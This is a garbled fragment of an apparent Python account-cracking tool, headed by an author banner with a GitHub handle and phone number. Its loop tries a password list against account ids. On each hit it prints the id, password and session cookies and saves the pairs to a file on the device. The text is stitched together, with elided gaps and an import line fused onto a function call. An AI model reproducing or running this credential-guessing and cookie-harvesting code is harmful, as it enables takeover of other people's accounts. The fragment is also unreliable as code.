...
\033[1;37m    ┌───────────────────────────────────────┐
 \033[1;37m   │ [>] AUTHOR   : ABIR                 │
\033[1;37m    │ [>] GITHUB   : Abir-vai            │
\033[1;37m    │ [>] WHATSAPP : +8801939116868         │
    ...
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\33[1;92m[ARIFIN-OK] '+ids+' | '+pas+'\033[1;92m')
                print(f"\r\33[1;36m=[🥰]=COOKIES: {kuki}\33[1;36m")
                oks.append(ids)
                open('/sdcard/ARIFIN-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
        pass       
___mix___()import bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
